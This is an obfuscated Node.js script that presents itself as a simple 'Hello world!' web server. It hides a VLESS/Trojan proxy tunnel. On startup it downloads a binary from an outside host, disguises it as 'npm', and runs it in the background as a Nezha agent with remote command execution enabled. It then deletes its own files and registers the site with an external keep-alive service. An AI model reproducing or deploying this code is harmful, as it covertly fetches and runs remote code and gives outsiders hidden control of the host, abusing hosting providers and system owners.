const _0x1c9172=_0x23ff;(function(_0x2491b1,_0x2a9e1f){const _0x126ce3=_0x23ff,_0x2b81f9=_0x2491b1();while(!![]){try{const _0x2b504f=-parseInt(_0x126ce3(0x162))/0x1*(parseInt(_0x126ce3(0x177))/0x2)+-parseInt(_0x126ce3(0x12e))/0x3+parseInt(_0x126ce3(0x187))/0x4+-parseInt(_0x126ce3(0x160))/0x5+parseInt(_0x126ce3(0x193))/0x6+parseInt(_0x126ce3(0x131))/0x7+parseInt(_0x126ce3(0x17d))/0x8;if(_0x2b504f===_0x2a9e1f)break;else _0x2b81f9['push'](_0x2b81f9['shift']());}catch(_0x21f266){_0x2b81f9['push'](_0x2b81f9['shift']());}}}(_0x365f,0xe84f2));const os=require('os'),http=require(_0x1c9172(0x195)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require(_0x1c9172(0x194)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1c9172(0x17b)][_0x1c9172(0x185)]||_0x1c9172(0x137),NEZHA_SERVER=process['env'][_0x1c9172(0x181)]||'',NEZHA_PORT=process[_0x1c9172(0x17b)][_0x1c9172(0x184)]||'',NEZHA_KEY=process[_0x1c9172(0x17b)][_0x1c9172(0x16c)]||'',DOMAIN=process['env'][_0x1c9172(0x199)]||'1234.abc.com',AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process['env'][_0x1c9172(0x138)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x1c9172(0x17b)][_0x1c9172(0x15c)]||'sub',NAME=process['env'][_0x1c9172(0x140)]||_0x1c9172(0x149),PORT=process[_0x1c9172(0x17b)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3f5200=_0x1c9172;try{const _0x4a0a60=await axios[_0x3f5200(0x13b)]('https://speed.cloudflare.com/meta'),_0x1e16f8=_0x4a0a60[_0x3f5200(0x17a)];ISP=(_0x1e16f8[_0x3f5200(0x190)]+'-'+_0x1e16f8['asOrganization'])[_0x3f5200(0x14b)](/ /g,'_');}catch(_0x43938c){ISP='Unknown';}};GetISP();function _0x23ff(_0x48633d,_0x208edd){_0x48633d=_0x48633d-0x127;const _0x365f64=_0x365f();let _0x23ff87=_0x365f64[_0x48633d];return _0x23ff87;}const httpServer=http[_0x1c9172(0x198)]((_0x1175d2,_0x1bcf53)=>{const _0x46e805=_0x1c9172;if(_0x1175d2['url']==='/'){const _0x4ae227=path[_0x46e805(0x168)](__dirname,_0x46e805(0x159));fs['readFile'](_0x4ae227,'utf8',(_0xededea,_0x149e97)=>{const _0x275ac3=_0x46e805;if(_0xededea){_0x1bcf53['writeHead'](0xc8,{'Content-Type':_0x275ac3(0x12f)}),_0x1bcf53[_0x275ac3(0x148)](_0x275ac3(0x15e));return;}_0x1bcf53[_0x275ac3(0x15d)](0xc8,{'Content-Type':_0x275ac3(0x12f)}),_0x1bcf53[_0x275ac3(0x148)](_0x149e97);});return;}else{if(_0x1175d2[_0x46e805(0x17c)]==='/'+SUB_PATH){const _0x4e399f=_0x46e805(0x161)+UUID+'@'+DOMAIN+_0x46e805(0x14c)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x46e805(0x170)+WSPATH+'#'+NAME+'-'+ISP,_0xda6e82='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x46e805(0x143)+DOMAIN+_0x46e805(0x170)+WSPATH+'#'+NAME+'-'+ISP,_0x1a6df0=_0x4e399f+'\x0a'+_0xda6e82,_0x26b25c=Buffer[_0x46e805(0x180)](_0x1a6df0)[_0x46e805(0x167)](_0x46e805(0x182));_0x1bcf53[_0x46e805(0x15d)](0xc8,{'Content-Type':_0x46e805(0x17f)}),_0x1bcf53[_0x46e805(0x148)](_0x26b25c+'\x0a');}else _0x1bcf53[_0x46e805(0x15d)](0x194,{'Content-Type':_0x46e805(0x17f)}),_0x1bcf53[_0x46e805(0x148)](_0x46e805(0x134));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x1c9172(0x14b)](/-/g,''),DNS_SERVERS=[_0x1c9172(0x13c),_0x1c9172(0x165)];function resolveHost(_0x3ab850){return new Promise((_0x204c3d,_0x2dfec8)=>{const _0x152547=_0x23ff;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x152547(0x141)](_0x3ab850)){_0x204c3d(_0x3ab850);return;}let _0x4a1d48=0x0;function _0x4dfa45(){const _0x5606f8=_0x152547;if(_0x4a1d48>=DNS_SERVERS[_0x5606f8(0x132)]){_0x2dfec8(new Error(_0x5606f8(0x15b)+_0x3ab850+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x4db144=DNS_SERVERS[_0x4a1d48];_0x4a1d48++;const _0x11f43c=_0x5606f8(0x172)+encodeURIComponent(_0x3ab850)+_0x5606f8(0x12c);axios[_0x5606f8(0x13b)](_0x11f43c,{'timeout':0x1388,'headers':{'Accept':_0x5606f8(0x13e)}})[_0x5606f8(0x15f)](_0x2eb919=>{const _0x38c516=_0x5606f8,_0x12c1f7=_0x2eb919['data'];if(_0x12c1f7['Status']===0x0&&_0x12c1f7['Answer']&&_0x12c1f7[_0x38c516(0x133)]['length']>0x0){const _0xf095d4=_0x12c1f7[_0x38c516(0x133)]['find'](_0x1b9820=>_0x1b9820[_0x38c516(0x16b)]===0x1);if(_0xf095d4){_0x204c3d(_0xf095d4[_0x38c516(0x17a)]);return;}}_0x4dfa45();})[_0x5606f8(0x127)](_0x2b1a6b=>{_0x4dfa45();});}_0x4dfa45();});}function handleVlessConnection(_0x3b10c8,_0x1ad629){const _0x25c098=_0x1c9172,[_0x1c1053]=_0x1ad629,_0x48e5dc=_0x1ad629[_0x25c098(0x147)](0x1,0x11);if(!_0x48e5dc[_0x25c098(0x128)]((_0x12e127,_0x47d2c6)=>_0x12e127==parseInt(uuid[_0x25c098(0x129)](_0x47d2c6*0x2,0x2),0x10)))return![];let _0x23ceea=_0x1ad629[_0x25c098(0x147)](0x11,0x12)['readUInt8']()+0x13;const _0x50603a=_0x1ad629[_0x25c098(0x147)](_0x23ceea,_0x23ceea+=0x2)[_0x25c098(0x13a)](0x0),_0x3ca029=_0x1ad629[_0x25c098(0x147)](_0x23ceea,_0x23ceea+=0x1)['readUInt8'](),_0x24f2d0=_0x3ca029==0x1?_0x1ad629[_0x25c098(0x147)](_0x23ceea,_0x23ceea+=0x4)[_0x25c098(0x168)]('.'):_0x3ca029==0x2?new TextDecoder()[_0x25c098(0x16d)](_0x1ad629['slice'](_0x23ceea+0x1,_0x23ceea+=0x1+_0x1ad629['slice'](_0x23ceea,_0x23ceea+0x1)[_0x25c098(0x188)]())):_0x3ca029==0x3?_0x1ad629[_0x25c098(0x147)](_0x23ceea,_0x23ceea+=0x10)[_0x25c098(0x197)]((_0x394440,_0x20d057,_0xa3529b,_0x4f4121)=>_0xa3529b%0x2?_0x394440[_0x25c098(0x196)](_0x4f4121['slice'](_0xa3529b-0x1,_0xa3529b+0x1)):_0x394440,[])[_0x25c098(0x14a)](_0x49cae9=>_0x49cae9['readUInt16BE'](0x0)[_0x25c098(0x167)](0x10))[_0x25c098(0x168)](':'):'';_0x3b10c8[_0x25c098(0x153)](new Uint8Array([_0x1c1053,0x0]));const _0xc4bc2b=createWebSocketStream(_0x3b10c8);return resolveHost(_0x24f2d0)['then'](_0x4107e3=>{const _0x502f17=_0x25c098;net['connect']({'host':_0x4107e3,'port':_0x50603a},function(){const _0x343cd0=_0x23ff;this[_0x343cd0(0x18d)](_0x1ad629['slice'](_0x23ceea)),_0xc4bc2b['on'](_0x343cd0(0x18e),()=>{})['pipe'](this)['on'](_0x343cd0(0x18e),()=>{})[_0x343cd0(0x183)](_0xc4bc2b);})['on'](_0x502f17(0x18e),()=>{});})[_0x25c098(0x127)](_0x588373=>{const _0x50e96b=_0x25c098;net[_0x50e96b(0x191)]({'host':_0x24f2d0,'port':_0x50603a},function(){const _0x253c6e=_0x50e96b;this['write'](_0x1ad629[_0x253c6e(0x147)](_0x23ceea)),_0xc4bc2b['on']('error',()=>{})['pipe'](this)['on'](_0x253c6e(0x18e),()=>{})[_0x253c6e(0x183)](_0xc4bc2b);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x4de19f,_0x793d80){const _0xd6e5f2=_0x1c9172;try{if(_0x793d80[_0xd6e5f2(0x132)]<0x3a)return![];const _0x36e8b8=_0x793d80[_0xd6e5f2(0x147)](0x0,0x38)['toString'](),_0x1a4936=[UUID];let _0x17a8e0=null;for(const _0x282ba6 of _0x1a4936){const _0x4de66d=crypto['createHash'](_0xd6e5f2(0x163))[_0xd6e5f2(0x179)](_0x282ba6)[_0xd6e5f2(0x164)]('hex');if(_0x4de66d===_0x36e8b8){_0x17a8e0=_0x282ba6;break;}}if(!_0x17a8e0)return![];let _0x16d839=0x38;_0x793d80[_0x16d839]===0xd&&_0x793d80[_0x16d839+0x1]===0xa&&(_0x16d839+=0x2);const _0x160abc=_0x793d80[_0x16d839];if(_0x160abc!==0x1)return![];_0x16d839+=0x1;const _0x47107c=_0x793d80[_0x16d839];_0x16d839+=0x1;let _0x1c1b27,_0x1c9b36;if(_0x47107c===0x1)_0x1c1b27=_0x793d80[_0xd6e5f2(0x147)](_0x16d839,_0x16d839+0x4)['join']('.'),_0x16d839+=0x4;else{if(_0x47107c===0x3){const _0x24d356=_0x793d80[_0x16d839];_0x16d839+=0x1,_0x1c1b27=_0x793d80[_0xd6e5f2(0x147)](_0x16d839,_0x16d839+_0x24d356)['toString'](),_0x16d839+=_0x24d356;}else{if(_0x47107c===0x4)_0x1c1b27=_0x793d80[_0xd6e5f2(0x147)](_0x16d839,_0x16d839+0x10)[_0xd6e5f2(0x197)]((_0x59d894,_0x271358,_0x1d295a,_0x32250e)=>_0x1d295a%0x2?_0x59d894[_0xd6e5f2(0x196)](_0x32250e[_0xd6e5f2(0x147)](_0x1d295a-0x1,_0x1d295a+0x1)):_0x59d894,[])[_0xd6e5f2(0x14a)](_0x54aad2=>_0x54aad2[_0xd6e5f2(0x13a)](0x0)[_0xd6e5f2(0x167)](0x10))[_0xd6e5f2(0x168)](':'),_0x16d839+=0x10;else return![];}}_0x1c9b36=_0x793d80[_0xd6e5f2(0x13a)](_0x16d839),_0x16d839+=0x2;_0x16d839<_0x793d80['length']&&_0x793d80[_0x16d839]===0xd&&_0x793d80[_0x16d839+0x1]===0xa&&(_0x16d839+=0x2);const _0xfcca33=createWebSocketStream(_0x4de19f);return resolveHost(_0x1c1b27)[_0xd6e5f2(0x15f)](_0xb1c1f0=>{const _0x30c0da=_0xd6e5f2;net[_0x30c0da(0x191)]({'host':_0xb1c1f0,'port':_0x1c9b36},function(){const _0xa50b2d=_0x30c0da;_0x16d839<_0x793d80[_0xa50b2d(0x132)]&&this[_0xa50b2d(0x18d)](_0x793d80[_0xa50b2d(0x147)](_0x16d839)),_0xfcca33['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0xa50b2d(0x183)](_0xfcca33);})['on'](_0x30c0da(0x18e),()=>{});})[_0xd6e5f2(0x127)](_0x2f694b=>{const _0x16ac00=_0xd6e5f2;net[_0x16ac00(0x191)]({'host':_0x1c1b27,'port':_0x1c9b36},function(){const _0x2c1e05=_0x16ac00;_0x16d839<_0x793d80[_0x2c1e05(0x132)]&&this[_0x2c1e05(0x18d)](_0x793d80[_0x2c1e05(0x147)](_0x16d839)),_0xfcca33['on'](_0x2c1e05(0x18e),()=>{})[_0x2c1e05(0x183)](this)['on'](_0x2c1e05(0x18e),()=>{})['pipe'](_0xfcca33);})['on'](_0x16ac00(0x18e),()=>{});}),!![];}catch(_0x221fe5){return![];}}wss['on'](_0x1c9172(0x174),(_0x3a5cdf,_0x55f1fe)=>{const _0x2251f8=_0x1c9172,_0x1998ad=_0x55f1fe[_0x2251f8(0x17c)]||'';_0x3a5cdf['once'](_0x2251f8(0x151),_0x1e7b3f=>{const _0x47c645=_0x2251f8;if(_0x1e7b3f[_0x47c645(0x132)]>0x11&&_0x1e7b3f[0x0]===0x0){const _0x7f827b=_0x1e7b3f[_0x47c645(0x147)](0x1,0x11),_0x4786ee=_0x7f827b[_0x47c645(0x128)]((_0x252f18,_0x562106)=>_0x252f18==parseInt(uuid[_0x47c645(0x129)](_0x562106*0x2,0x2),0x10));if(_0x4786ee){!handleVlessConnection(_0x3a5cdf,_0x1e7b3f)&&_0x3a5cdf[_0x47c645(0x173)]();return;}}!handleTrojanConnection(_0x3a5cdf,_0x1e7b3f)&&_0x3a5cdf[_0x47c645(0x173)]();})['on'](_0x2251f8(0x18e),()=>{});});const getDownloadUrl=()=>{const _0x3fff3e=_0x1c9172,_0x778e60=os['arch']();return _0x778e60==='arm'||_0x778e60==='arm64'||_0x778e60===_0x3fff3e(0x18c)?!NEZHA_PORT?_0x3fff3e(0x14f):_0x3fff3e(0x139):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x3fff3e(0x192);},downloadFile=async()=>{const _0x10a087=_0x1c9172;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x593891=getDownloadUrl(),_0x188da5=await axios({'method':_0x10a087(0x13b),'url':_0x593891,'responseType':_0x10a087(0x14d)}),_0x321c48=fs['createWriteStream'](_0x10a087(0x186));return _0x188da5[_0x10a087(0x17a)]['pipe'](_0x321c48),new Promise((_0x56a59c,_0x193e98)=>{const _0x153af1=_0x10a087;_0x321c48['on'](_0x153af1(0x13d),()=>{const _0x43ae52=_0x153af1;console['log'](_0x43ae52(0x13f)),exec(_0x43ae52(0x154),_0xbb1204=>{if(_0xbb1204)_0x193e98(_0xbb1204);_0x56a59c();});}),_0x321c48['on'](_0x153af1(0x18e),_0x193e98);});}catch(_0x562e20){throw _0x562e20;}},runnz=async()=>{const _0x5f1f89=_0x1c9172;try{const _0x42e080=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x42e080[_0x5f1f89(0x17e)]()!==''){console[_0x5f1f89(0x16a)](_0x5f1f89(0x130));return;}}catch(_0x314c90){}await downloadFile();let _0x503447='',_0x52798b=[_0x5f1f89(0x14e),_0x5f1f89(0x155),_0x5f1f89(0x166),_0x5f1f89(0x152),_0x5f1f89(0x18a),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4a3b7a=_0x52798b[_0x5f1f89(0x158)](NEZHA_PORT)?'--tls':'';_0x503447=_0x5f1f89(0x136)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5f1f89(0x178)+NEZHA_KEY+'\x20'+_0x4a3b7a+_0x5f1f89(0x150);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3c8615=NEZHA_SERVER[_0x5f1f89(0x158)](':')?NEZHA_SERVER['split'](':')[_0x5f1f89(0x135)]():'',_0x1b3c67=_0x52798b[_0x5f1f89(0x158)](_0x3c8615)?'true':_0x5f1f89(0x18b),_0x46e0dc=_0x5f1f89(0x16e)+NEZHA_KEY+_0x5f1f89(0x15a)+NEZHA_SERVER+_0x5f1f89(0x142)+_0x1b3c67+_0x5f1f89(0x144)+UUID;fs[_0x5f1f89(0x176)](_0x5f1f89(0x146),_0x46e0dc);}_0x503447=_0x5f1f89(0x12d);}else{console['log'](_0x5f1f89(0x12b));return;}}try{exec(_0x503447,{'shell':_0x5f1f89(0x18f)},_0x1afedf=>{const _0x1f2200=_0x5f1f89;if(_0x1afedf)console[_0x1f2200(0x18e)]('npm\x20running\x20error:',_0x1afedf);else console[_0x1f2200(0x16a)](_0x1f2200(0x189));});}catch(_0x35f203){console[_0x5f1f89(0x18e)](_0x5f1f89(0x171)+_0x35f203);}};async function addAccessTask(){const _0x5a6a34=_0x1c9172;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3684d1=_0x5a6a34(0x169)+DOMAIN;try{const _0x2ca1da=await axios[_0x5a6a34(0x157)]('https://oooo.serv00.net/add-url',{'url':_0x3684d1},{'headers':{'Content-Type':_0x5a6a34(0x16f)}});console[_0x5a6a34(0x16a)](_0x5a6a34(0x12a));}catch(_0x23f8b6){}}const delFiles=()=>{const _0x5bd13f=_0x1c9172;fs[_0x5bd13f(0x145)](_0x5bd13f(0x186),()=>{}),fs[_0x5bd13f(0x145)](_0x5bd13f(0x146),()=>{});};httpServer[_0x1c9172(0x175)](PORT,()=>{const _0xab12bc=_0x1c9172;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xab12bc(0x16a)](_0xab12bc(0x156)+PORT);});function _0x365f(){const _0xa11ab0=['base64','pipe','NEZHA_PORT','UUID','npm','568716vONucU','readUInt8','npm\x20is\x20running','2083','false','aarch64','write','error','/bin/bash','country','connect','https://amd64.ssss.nyc.mn/agent','5129148JiAFjH','path','http','concat','reduce','createServer','DOMAIN','catch','every','substr','Automatic\x20Access\x20Task\x20added\x20successfully','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','&type=A','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','2247339sygLsA','text/html','npm\x20is\x20already\x20running,\x20skip\x20running...','2794141cFHyaq','length','Answer','Not\x20Found\x0a','pop','setsid\x20nohup\x20./npm\x20-s\x20','bf49611b-25a8-4f5f-9e6a-a635188aaed3','WSPATH','https://arm64.ssss.nyc.mn/agent','readUInt16BE','get','8.8.4.4','finish','application/dns-json','npm\x20download\x20successfully','NAME','test','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','&fp=chrome&type=ws&host=','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','unlink','config.yaml','slice','end','Hug','map','replace',':443?encryption=none&security=tls&sni=','stream','443','https://arm64.ssss.nyc.mn/v1','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','message','2087','send','chmod\x20+x\x20npm','8443','Server\x20is\x20running\x20on\x20port\x20','post','includes','index.html','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Failed\x20to\x20resolve\x20','SUB_PATH','writeHead','Hello\x20world!','then','1298570gUKpxw','vless://','283133GPSwcY','sha224','digest','1.1.1.1','2096','toString','join','https://','log','type','NEZHA_KEY','decode','client_secret:\x20','application/json','&path=%2F','error:\x20','https://dns.google/resolve?name=','close','connection','listen','writeFileSync','2zZUJaJ','\x20-p\x20','update','data','env','url','6778384AVFugX','trim','text/plain','from','NEZHA_SERVER'];_0x365f=function(){return _0xa11ab0;};return _0x365f();}
